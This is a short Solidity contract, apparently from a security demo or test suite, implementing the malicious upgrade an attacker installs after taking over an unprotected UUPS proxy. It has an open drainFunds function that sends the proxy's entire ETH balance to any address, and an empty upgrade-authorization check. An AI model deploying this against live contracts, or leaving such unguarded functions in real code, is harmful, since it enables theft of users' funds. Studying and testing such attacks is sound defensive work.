// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";

/// @notice Payload deployed by an attacker after exploiting VulnerableUUPS.
contract MaliciousImpl is Initializable, UUPSUpgradeable {
    // Preserve storage layout compatibility with VulnerableUUPS (value at slot 0,
    // owner-unaware) so the existing state is not corrupted.
    uint256 public value;

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {}

    // OZ v5: UUPSUpgradeable is stateless (no init).
    function initialize() public initializer {}

    /// Drain the entire ETH balance held by the proxy.
    function drainFunds(address payable recipient) external {
        recipient.transfer(address(this).balance);
    }

    function _authorizeUpgrade(address) internal override {}
}
